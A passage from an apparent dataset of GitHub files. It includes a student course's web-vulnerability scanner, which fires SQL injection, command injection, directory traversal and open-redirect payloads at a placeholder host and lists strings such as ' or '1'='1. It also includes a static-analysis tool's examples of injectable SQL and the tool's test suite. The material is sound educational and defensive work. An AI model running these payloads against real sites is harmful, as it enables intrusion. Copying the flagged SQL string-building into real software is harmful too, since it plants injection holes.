open_redirect=======\n    if attackType == open_redirect:\n        if len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n            return True\n\n    \n    #=======check for server_injection ====\n    if attackType == server_injection:\n        #included index.php\n        indexPHP = requests.get(BASE_URL + \"/index.php\")\n\n        if indexPHP.text in html:\n            return attackType\n        #uname -a successful:\n        if \"GNU/Linux\" in html:\n            return attackType\n\n    return None;\n    \ndef get_payloads(v=False):\n    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()\n\n    if v == True:\n        for p in payloads:\n            print p[0]\n\n    return payloads\n\n\nif __name__ == \"__main__\":\n    # get_payloads(v=True)\n\n    payloads = get_payloads()\n    url_list = ['/directorytraversal/directorytraversal.php',\n                \"/commandinjection/commandinjection.php\",\n                \"/sqli/sqli.php\",\n                \"/serverside/eval2.php\",\n                \"/openredirect/openredirect.php\"]\n    for payload in payloads:\n        injectPayload(url_list[0], 'ascii', 'GET', payload)\n        injectPayload(url_list[1], \"host\", 'POST', payload)\n        injectPayload(url_list[2], \"username\", \"POST\", payload)\n        injectPayload(url_list[3], \"page\", \"POST\", payload)\n        injectPayload(url_list[4], \"redirect\", \"GET\", payload)\n\n    # with open('exploits/test.json', 'w') as f:\n    #     json.dump(final_output, f)\n\n    # format_lu_list()\n    ## test directory shell\n    # url = '/directorytraversal/directorytraversal.php'\n    # payloads = dirtraversal.get_all()\n\n    # for payload in payloads:\n    #     ## need param after endpoint ?param=\n        \n    #     injectPayload(url, 'ascii', 'GET', payload)\n\n\n    # ## test shell command\n    # ## post in the form\n    # url = \"/commandinjection/commandinjection.php\"\n    # payloads = cmd.get_all()\n    # for payload in payloads:\n    #   injectPayload(url, \"host\", 'POST', payload)\n\n    #sqli\n    # post in the form\n    #url = \"/sqli/sqli.php\"\n    #payloads = sqli.get_all()\n    #for payload in payloads:\n    #   injectPayload(url, \"username\", \"POST\", payload)\n\n    #Test for server side code injection\n    # url = \"/serverside/eval2.php\"\n    # payloads = ssci.get_all(url)\n    # for payload in payloads:\n    #   injectPayload(url, \"page\", \"POST\", payload)\n    '''\n    #test for open redirect\n    url = \"/openredirect/openredirect.php\"\n    orPayload = oRedirect.get_all()\n    for payload in orPayload:\n        injectPayload(url, \"redirect\", \"GET\", payload)\n    '''",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/CS5331-Group-10/A3/blob/72f5292f0edc0c86f86d6c7f1bbca6d7bd3a04b3",
        "file_path": "/payloads/sqli.py",
        "source": "import difflib\n\n\"\"\"\nSolutions:\n1. compare pages only  \nmatch = re.findall(r'<pre>', html)\n\n2. add false page to compare\nmatch = re.findall(r'<ins>.+', compare_res)\n\n3. add another label \"' or '1'='1\" as ground truth\nAssumption: should be the same page for sql injection, different with false page\n\"\"\"\n\ndef get_false():\n\t## the second is taken as ground truth to filter out real sql-injection page\n\tpayloads = [\"' and '1=2\", \"' or '1'='1\"]\n\treturn payloads\n\n# def get_false():\n# \tpayloads = \"' and '1=2\"\n# \treturn payloads\n\ndef get_all():\n\t\"\"\"\n\tConsider different db types and versions\n\t-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite\n\t' OR '1'='1' --\n\t' OR '1'='1' /*\n\t-- MySQL\n\t' OR '1'='1' #\n\t-- Access (using null characters)\n\t' OR '1'='1' %00\n\t' OR '1'='1' %16\n\t\"\"\"\n\t## temp test\n\t# payloads = [\"' or '1=1\"]\n\tpayloads = [\"' or '1=1\",   \"'1 'or' 1'='1\",\"' or '1'='1\",  \"'or 1=1#\", \"' OR '1=1 %00\"]\n\tpayloads = [(item, \"SQL Injection\") for item in payloads]\n\treturn payloads\t\n\ndef compare_html(html1, html2):\n\tdiff_html = \"\"\n\tdiffs = difflib.ndiff(html1.splitlines(), html2.splitlines())\n\tfor ele in diffs:\n\t\tif (ele[0] == \"-\"):\n\t\t\tdiff_html += \"<del>%s</del>\" % ele[1:].strip()\n\t\telif(ele[0] == \"+\"):\n\t\t\tdiff_html += \"<ins>%s</ins>\" %ele[1:].strip()\n\n\treturn diff_html\n\nif __name__ == \"__main__\":\t\n\tprint get_all()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/CS5331-Group-10/A3/blob/72f5292f0edc0c86f86d6c7f1bbca6d7bd3a04b3",
        "file_path": "/payloads/test_inject.py",
        "source": "import requests\nimport json\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\nimport collections\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\nclass AutoDict(dict):\n    def __getitem__(self, item):\n        try:\n            return dict.__getitem__(self, item)\n        except KeyError:\n            value = self[item] = type(self)()\n            return value\n\nfinal_output=[]\nvul_list = []\nvul_classes = AutoDict()\n\ndef format_vul_list():\n    sorted_list = sorted(vul_list, key=lambda x: x[2][1])\n    print(sorted_list)\n\n## write to json file if possible\ndef write_file(url, paramname, payload, method):\n    ## initialize dict\n    sub_elements = AutoDict()\n    lists = []\n    sub_elements['endpoint']= url\n    sub_elements['params']['key1']= payload[0]\n    sub_elements['method'] = method\n    # update current dict\n    if(vul_classes.get('class')==payload[1]):\n        lists = vul_classes['results'][BASE_URL]\n\n        for ele in lists:\n            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :\n                continue\n            else:\n                lists.append(sub_elements)\n         \n        vul_classes['results'][BASE_URL]=lists\n\n    else:\n        vul_classes['class'] = payload[1]        \n        lists.append(sub_elements)\n        vul_classes['results'][BASE_URL]=lists\n\n\n\ndef injectPayload(url, paramname, method, payload, verbose = False):\n    parsedURL = BASE_URL + url  \n    html = \"\"\n\n    #if get\n    if method == \"GET\":\n        getURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n        content = requests.get(getURL)\n        html =  content.text\n\n    #if post\n    elif method == \"POST\":\n        content = requests.post(parsedURL, data={paramname:payload[0]})\n        html = content.text\n\n    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n    \n    #if function returns:\n    if result is not None:\n        print(url, payload)\n        vul_list.append([url, paramname, payload, method])\n\n        #generateExploit(parsedURL, method, paramname, payload)\n        return True\n    return None\n\ndef timeid(full=False):\n    if full==False:\n        return datetime.now().strftime(\"%S-%f\")\n    else:\n        return datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n    dirname = \"exploits/\"\n    if not os.path.exists(dirname):\n        os.makedirs(dirname)\n\n    copy(\"exploit.py\", dirname)\n\n    f = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n    f.write(\"python exploit.py \" + '\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n    \n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n    if v == True:\n        print html\n\n    #===== check for directory traversal =====\n    if attackType == directory_traversal:\n        match = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #======= check for shell command injection ======\n    if attackType == shell_command:\n        match = re.findall(r'GNU/Linux', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #===== check for sql_injection ======\n    if attackType == sql_injection:\n        ## for real sql injection, the payloads should return the same result\n        ## then compare the fake page with the true page to see the difference\n        falsePayloads = sqli.get_false()\n        #if get\n        badhtml = []\n        for falsePayload in falsePayloads:\n            if method == \"GET\":\n                getURL = url + \"?\" + paramname+\"=\"+falsePayload\n                false_page = requests.get(getURL)\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                else:\n                    badhtml.append(requests.get(url).text)\n            #if post\n            elif method == \"POST\":\n                false_page = requests.post(url, data={paramname:falsePayload})\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                    # print(html)\n                else:\n                    badhtml.append(requests.get(url).text)\n\n        if(content.status_code==200) and badhtml[1]==html:\n            compare_res = sqli.compare_html(badhtml[0], html)  \n            match = re.findall(r'<ins>.+', compare_res)\n\n        else:\n            match = \"\"\n        if len(match) ==0 :\n            return None\n\n        return match\n\n    #====== check for open_redirect=======\n    if attackType == open_redirect:\n        if len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n            return True\n\n    \n    #=======check for server_injection ====\n    if attackType == server_injection:\n        #included index.php\n        indexPHP = requests.get(BASE_URL + \"/index.php\")\n\n        if indexPHP.text in html:\n            return attackType\n        #uname -a successful:\n        if \"GNU/Linux\" in html:\n            return attackType\n\n    return None;\n    \ndef get_payloads(v=False):\n    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()\n\n    if v == True:\n        for p in payloads:\n            print p[0]\n\n    return payloads\n\n\nif __name__ == \"__main__\":\n    # get_payloads(v=True)\n\n    payloads = sqli.get_all()\n    url_list = ['/directorytraversal/directorytraversal.php',\n                \"/commandinjection/commandinjection.php\",\n                \"/sqli/sqli.php\",\n                \"/serverside/eval2.php\",\n                \"/openredirect/openredirect.php\"]\n    for payload in payloads:\n        # injectPayload(url_list[0], 'ascii', 'GET', payload)\n        # injectPayload(url_list[1], \"host\", 'POST', payload)\n        injectPayload(url_list[2], \"username\", \"POST\", payload)\n        injectPayload(url_list[3], \"page\", \"POST\", payload)\n        injectPayload(url_list[4], \"redirect\", \"GET\", payload)\n\n    # with open('exploits/test.json', 'w') as f:\n    #     json.dump(final_output, f)\n\n    # format_lu_list()\n    ## test directory shell\n    # url = '/directorytraversal/directorytraversal.php'\n    # payloads = dirtraversal.get_all()\n\n    # for payload in payloads:\n    #     ## need param after endpoint ?param=\n        \n    #     injectPayload(url, 'ascii', 'GET', payload)\n\n\n    # ## test shell command\n    # ## post in the form\n    # url = \"/commandinjection/commandinjection.php\"\n    # payloads = cmd.get_all()\n    # for payload in payloads:\n    #   injectPayload(url, \"host\", 'POST', payload)\n\n    #sqli\n    # post in the form\n    #url = \"/sqli/sqli.php\"\n    #payloads = sqli.get_all()\n    #for payload in payloads:\n    #   injectPayload(url, \"username\", \"POST\", payload)\n\n    #Test for server side code injection\n    # url = \"/serverside/eval2.php\"\n    # payloads = ssci.get_all(url)\n    # for payload in payloads:\n    #   injectPayload(url, \"page\", \"POST\", payload)\n    '''\n    #test for open redirect\n    url = \"/openredirect/openredirect.php\"\n    orPayload = oRedirect.get_all()\n    for payload in orPayload:\n        injectPayload(url, \"redirect\", \"GET\", payload)\n    '''",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/zeroSteiner/bandit-ss/blob/2516e40d861df46e2412ce4f858343b6f4bf7a1c",
        "file_path": "/examples/sql_statements.py",
        "source": "import sqlalchemy\n\n# bad\nquery = \"SELECT * FROM foo WHERE id = '%s'\" % identifier\nquery = \"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value\nquery = \"DELETE FROM foo WHERE id = '%s'\" % identifier\nquery = \"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier\nquery = \"\"\"WITH cte AS (SELECT x FROM foo)\nSELECT x FROM cte WHERE x = '%s'\"\"\" % identifier\n\n# bad\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\" % value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\" % identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier)\n\n# good\ncur.execute(\"SELECT * FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"INSERT INTO foo VALUES ('a', 'b', '%s')\", value)\ncur.execute(\"DELETE FROM foo WHERE id = '%s'\", identifier)\ncur.execute(\"UPDATE foo SET value = 'b' WHERE id = '%s'\", identifier)\n\n# bad\nquery = \"SELECT \" + val + \" FROM \" + val +\" WHERE id = \" + val\n\n# bad\ncur.execute(\"SELECT \" + val + \" FROM \" + val +\" WHERE id = \" + val)\n\n\n# bug: https://bugs.launchpad.net/bandit/+bug/1479625\ndef a():\n    def b():\n        pass\n    return b\n\na()(\"SELECT %s FROM foo\" % val)\n\n# real world false positives\nchoices=[('server_list', _(\"Select from active instances\"))]\nprint(\"delete from the cache as the first argument\")\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/zeroSteiner/bandit-ss/blob/2516e40d861df46e2412ce4f858343b6f4bf7a1c",
        "file_path": "/tests/functional/test_functional.py",
        "source": "# -*- coding:utf-8 -*-\n#\n# Copyright 2014 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport os\n\nimport six\nimport testtools\n\nfrom bandit.core import config as b_config\nfrom bandit.core import constants as C\nfrom bandit.core import manager as b_manager\nfrom bandit.core import metrics\nfrom bandit.core import test_set as b_test_set\n\n\nclass FunctionalTests(testtools.TestCase):\n\n    '''Functional tests for bandit test plugins.\n\n    This set of tests runs bandit against each example file in turn\n    and records the score returned. This is compared to a known good value.\n    When new tests are added to an example the expected result should be\n    adjusted to match.\n    '''\n\n    def setUp(self):\n        super(FunctionalTests, self).setUp()\n        # NOTE(tkelsey): bandit is very sensitive to paths, so stitch\n        # them up here for the testing environment.\n        #\n        path = os.path.join(os.getcwd(), 'bandit', 'plugins')\n        b_conf = b_config.BanditConfig()\n        self.b_mgr = b_manager.BanditManager(b_conf, 'file')\n        self.b_mgr.b_conf._settings['plugins_dir'] = path\n        self.b_mgr.b_ts = b_test_set.BanditTestSet(config=b_conf)\n\n    def run_example(self, example_script, ignore_nosec=False):\n        '''A helper method to run the specified test\n\n        This method runs the test, which populates the self.b_mgr.scores\n        value. Call this directly if you need to run a test, but do not\n        need to test the resulting scores against specified values.\n        :param example_script: Filename of an example script to test\n        '''\n        path = os.path.join(os.getcwd(), 'examples', example_script)\n        self.b_mgr.ignore_nosec = ignore_nosec\n        self.b_mgr.discover_files([path], True)\n        self.b_mgr.run_tests()\n\n    def check_example(self, example_script, expect, ignore_nosec=False):\n        '''A helper method to test the scores for example scripts.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected counts of issue types\n        '''\n        # reset scores for subsequent calls to check_example\n        self.b_mgr.scores = []\n        self.run_example(example_script, ignore_nosec=ignore_nosec)\n        expected = 0\n        result = 0\n        for test_scores in self.b_mgr.scores:\n            for score_type in test_scores:\n                self.assertIn(score_type, expect)\n                for rating in expect[score_type]:\n                    expected += (\n                        expect[score_type][rating] * C.RANKING_VALUES[rating]\n                    )\n                result += sum(test_scores[score_type])\n        self.assertEqual(expected, result)\n\n    def check_metrics(self, example_script, expect):\n        '''A helper method to test the metrics being returned.\n\n        :param example_script: Filename of an example script to test\n        :param expect: dict with expected values of metrics\n        '''\n        self.b_mgr.metrics = metrics.Metrics()\n        self.b_mgr.scores = []\n        self.run_example(example_script)\n\n        # test general metrics (excludes issue counts)\n        m = self.b_mgr.metrics.data\n        for k in expect:\n            if k != 'issues':\n                self.assertEqual(expect[k], m['_totals'][k])\n        # test issue counts\n        if 'issues' in expect:\n            for (criteria, default) in C.CRITERIA:\n                for rank in C.RANKING:\n                    label = '{0}.{1}'.format(criteria, rank)\n                    expected = 0\n                    if expect['issues'].get(criteria, None).get(rank, None):\n                        expected = expect['issues'][criteria][rank]\n                    self.assertEqual(expected, m['_totals'][label])\n\n    def test_binding(self):\n        '''Test the bind-to-0.0.0.0 example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'MEDIUM': 1}}\n        self.check_example('binding.py', expect)\n\n    def test_crypto_md5(self):\n        '''Test the `hashlib.md5` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n        self.check_example('crypto-md5.py', expect)\n\n    def test_ciphers(self):\n        '''Test the `Crypto.Cipher` example.'''\n        expect = {'SEVERITY': {'HIGH': 13},\n                  'CONFIDENCE': {'HIGH': 13}}\n        self.check_example('ciphers.py', expect)\n\n    def test_cipher_modes(self):\n        '''Test for insecure cipher modes.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('cipher-modes.py', expect)\n\n    def test_eval(self):\n        '''Test the `eval` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('eval.py', expect)\n\n    def test_mark_safe(self):\n        '''Test the `mark_safe` example.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('mark_safe.py', expect)\n\n    def test_exec(self):\n        '''Test the `exec` example.'''\n        filename = 'exec-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n            expect = {'SEVERITY': {'MEDIUM': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        else:\n            filename = filename.format('py3')\n            expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example(filename, expect)\n\n    def test_exec_as_root(self):\n        '''Test for the `run_as_root=True` keyword argument.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'MEDIUM': 5}}\n        self.check_example('exec-as-root.py', expect)\n\n    def test_hardcoded_passwords(self):\n        '''Test for hard-coded passwords.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'MEDIUM': 7}}\n        self.check_example('hardcoded-passwords.py', expect)\n\n    def test_hardcoded_tmp(self):\n        '''Test for hard-coded /tmp, /var/tmp, /dev/shm.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('hardcoded-tmp.py', expect)\n\n    def test_httplib_https(self):\n        '''Test for `httplib.HTTPSConnection`.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('httplib_https.py', expect)\n\n    def test_imports_aliases(self):\n        '''Test the `import X as Y` syntax.'''\n        expect = {\n            'SEVERITY': {'LOW': 4, 'MEDIUM': 5, 'HIGH': 0},\n            'CONFIDENCE': {'HIGH': 9}\n        }\n        self.check_example('imports-aliases.py', expect)\n\n    def test_imports_from(self):\n        '''Test the `from X import Y` syntax.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('imports-from.py', expect)\n\n    def test_imports_function(self):\n        '''Test the `__import__` function.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports-function.py', expect)\n\n    def test_telnet_usage(self):\n        '''Test for `import telnetlib` and Telnet.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('telnetlib.py', expect)\n\n    def test_ftp_usage(self):\n        '''Test for `import ftplib` and FTP.* calls.'''\n        expect = {'SEVERITY': {'HIGH': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('ftplib.py', expect)\n\n    def test_imports(self):\n        '''Test for dangerous imports.'''\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('imports.py', expect)\n\n    def test_mktemp(self):\n        '''Test for `tempfile.mktemp`.'''\n        expect = {'SEVERITY': {'MEDIUM': 4}, 'CONFIDENCE': {'HIGH': 4}}\n        self.check_example('mktemp.py', expect)\n\n    def test_nonsense(self):\n        '''Test that a syntactically invalid module is skipped.'''\n        self.run_example('nonsense.py')\n        self.assertEqual(1, len(self.b_mgr.skipped))\n\n    def test_okay(self):\n        '''Test a vulnerability-free file.'''\n        expect = {'SEVERITY': {}, 'CONFIDENCE': {}}\n        self.check_example('okay.py', expect)\n\n    def test_os_chmod(self):\n        '''Test setting file permissions.'''\n        filename = 'os-chmod-{}.py'\n        if six.PY2:\n            filename = filename.format('py2')\n        else:\n            filename = filename.format('py3')\n        expect = {\n            'SEVERITY': {'MEDIUM': 2, 'HIGH': 8},\n            'CONFIDENCE': {'MEDIUM': 1, 'HIGH': 9}\n        }\n        self.check_example(filename, expect)\n\n    def test_os_exec(self):\n        '''Test for `os.exec*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-exec.py', expect)\n\n    def test_os_popen(self):\n        '''Test for `os.popen`.'''\n        expect = {'SEVERITY': {'LOW': 8, 'MEDIUM': 0, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 9}}\n        self.check_example('os-popen.py', expect)\n\n    def test_os_spawn(self):\n        '''Test for `os.spawn*`.'''\n        expect = {'SEVERITY': {'LOW': 8}, 'CONFIDENCE': {'MEDIUM': 8}}\n        self.check_example('os-spawn.py', expect)\n\n    def test_os_startfile(self):\n        '''Test for `os.startfile`.'''\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'MEDIUM': 3}}\n        self.check_example('os-startfile.py', expect)\n\n    def test_os_system(self):\n        '''Test for `os.system`.'''\n        expect = {'SEVERITY': {'LOW': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('os_system.py', expect)\n\n    def test_pickle(self):\n        '''Test for the `pickle` module.'''\n        expect = {\n            'SEVERITY': {'LOW': 2, 'MEDIUM': 6},\n            'CONFIDENCE': {'HIGH': 8}\n        }\n        self.check_example('pickle_deserialize.py', expect)\n\n    def test_popen_wrappers(self):\n        '''Test the `popen2` and `commands` modules.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('popen_wrappers.py', expect)\n\n    def test_random_module(self):\n        '''Test for the `random` module.'''\n        expect = {'SEVERITY': {'LOW': 6}, 'CONFIDENCE': {'HIGH': 6}}\n        self.check_example('random_module.py', expect)\n\n    def test_requests_ssl_verify_disabled(self):\n        '''Test for the `requests` library skipping verification.'''\n        expect = {'SEVERITY': {'HIGH': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('requests-ssl-verify-disabled.py', expect)\n\n    def test_skip(self):\n        '''Test `#nosec` and `#noqa` comments.'''\n        expect = {'SEVERITY': {'LOW': 5}, 'CONFIDENCE': {'HIGH': 5}}\n        self.check_example('skip.py', expect)\n\n    def test_ignore_skip(self):\n        '''Test --ignore-nosec flag.'''\n        expect = {'SEVERITY': {'LOW': 7}, 'CONFIDENCE': {'HIGH': 7}}\n        self.check_example('skip.py', expect, ignore_nosec=True)\n\n    def test_sql_statements(self):\n        '''Test for SQL injection through string building.'''\n        expect = {\n            'SEVERITY': {'MEDIUM': 12},\n            'CONFIDENCE': {'LOW': 7, 'MEDIUM': 5}}\n        self.check_example('sql_statements.py', expect)\n\n    def test_ssl_insecure_version(self):\n        '''Test for insecure SSL protocol versions.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 10, 'HIGH': 7},\n            'CONFIDENCE': {'LOW': 0, 'MEDIUM': 11, 'HIGH': 7}\n        }\n        self.check_example('ssl-insecure-version.py', expect)\n\n    def test_subprocess_shell(self):\n        '''Test for `subprocess.Popen` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'HIGH': 3, 'MEDIUM': 1, 'LOW': 14},\n            'CONFIDENCE': {'HIGH': 17, 'LOW': 1}\n        }\n        self.check_example('subprocess_shell.py', expect)\n\n    def test_urlopen(self):\n        '''Test for dangerous URL opening.'''\n        expect = {'SEVERITY': {'MEDIUM': 14}, 'CONFIDENCE': {'HIGH': 14}}\n        self.check_example('urlopen.py', expect)\n\n    def test_utils_shell(self):\n        '''Test for `utils.execute*` with `shell=True`.'''\n        expect = {\n            'SEVERITY': {'LOW': 5},\n            'CONFIDENCE': {'HIGH': 5}\n        }\n        self.check_example('utils-shell.py', expect)\n\n    def test_wildcard_injection(self):\n        '''Test for wildcard injection in shell commands.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4, 'MEDIUM': 0, 'LOW': 10},\n            'CONFIDENCE': {'MEDIUM': 5, 'HIGH': 9}\n        }\n        self.check_example('wildcard-injection.py', expect)\n\n    def test_yaml(self):\n        '''Test for `yaml.load`.'''\n        expect = {'SEVERITY': {'MEDIUM': 1}, 'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('yaml_load.py', expect)\n\n    def test_jinja2_templating(self):\n        '''Test jinja templating for potential XSS bugs.'''\n        expect = {\n            'SEVERITY': {'HIGH': 4},\n            'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}\n        }\n        self.check_example('jinja2_templating.py', expect)\n\n    def test_secret_config_option(self):\n        '''Test for `secret=True` in Oslo's config.'''\n        expect = {\n            'SEVERITY': {'LOW': 1, 'MEDIUM': 2},\n            'CONFIDENCE': {'MEDIUM': 3}\n        }\n        self.check_example('secret-config-option.py', expect)\n\n    def test_mako_templating(self):\n        '''Test Mako templates for XSS.'''\n        expect = {'SEVERITY': {'MEDIUM': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('mako_templating.py', expect)\n\n    def test_xml(self):\n        '''Test xml vulnerabilities.'''\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_celementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 2}}\n        self.check_example('xml_expatbuilder.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 3, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 3, 'MEDIUM': 1}}\n        self.check_example('xml_lxml.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_pulldom.py', expect)\n\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('xml_xmlrpc.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 4},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 4}}\n        self.check_example('xml_etree_elementtree.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 1, 'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1, 'MEDIUM': 1}}\n        self.check_example('xml_expatreader.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 2},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 2}}\n        self.check_example('xml_minidom.py', expect)\n\n        expect = {'SEVERITY': {'LOW': 2, 'HIGH': 6},\n                  'CONFIDENCE': {'HIGH': 2, 'MEDIUM': 6}}\n        self.check_example('xml_sax.py', expect)\n\n    def test_httpoxy(self):\n        '''Test httpoxy vulnerability.'''\n        expect = {'SEVERITY': {'HIGH': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('httpoxy_cgihandler.py', expect)\n        self.check_example('httpoxy_twisted_script.py', expect)\n        self.check_example('httpoxy_twisted_directory.py', expect)\n\n    def test_asserts(self):\n        '''Test catching the use of assert.'''\n        expect = {'SEVERITY': {'LOW': 1},\n                  'CONFIDENCE': {'HIGH': 1}}\n        self.check_example('assert.py', expect)\n\n    def test_paramiko_injection(self):\n        '''Test paramiko command execution.'''\n        expect = {'SEVERITY': {'MEDIUM': 2},\n                  'CONFIDENCE': {'MEDIUM': 2}}\n        self.check_example('paramiko_injection.py', expect)\n\n    def test_partial_path(self):\n        '''Test process spawning with partial file paths.'''\n        expect = {'SEVERITY': {'LOW': 11},\n                  'CONFIDENCE': {'HIGH': 11}}\n\n        self.check_example('partial_path_process.py', expect)\n\n    def test_try_except_continue(self):\n        '''Test try, except, continue detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                    if x.__name__ == 'try_except_continue'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_continue.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_continue.py', expect)\n\n    def test_try_except_pass(self):\n        '''Test try, except pass detection.'''\n        test = next((x for x in self.b_mgr.b_ts.tests['ExceptHandler']\n                     if x.__name__ == 'try_except_pass'))\n\n        test._config = {'check_typed_exception': True}\n        expect = {'SEVERITY': {'LOW': 3}, 'CONFIDENCE': {'HIGH': 3}}\n        self.check_example('try_except_pass.py', expect)\n\n        test._config = {'check_typed_exception': False}\n        expect = {'SEVERITY': {'LOW': 2}, 'CONFIDENCE': {'HIGH': 2}}\n        self.check_example('try_except_pass.py', expect)\n\n    def test_metric_gathering(self):\n        expect = {\n            'nosec': 2, 'loc': 7,\n            'issues': {'CONFIDENCE': {'HIGH': 5}, 'SEVERITY': {'LOW': 5}}\n        }\n        self.check_metrics('skip.py', expect)\n        expect = {\n            'nosec': 0, 'loc': 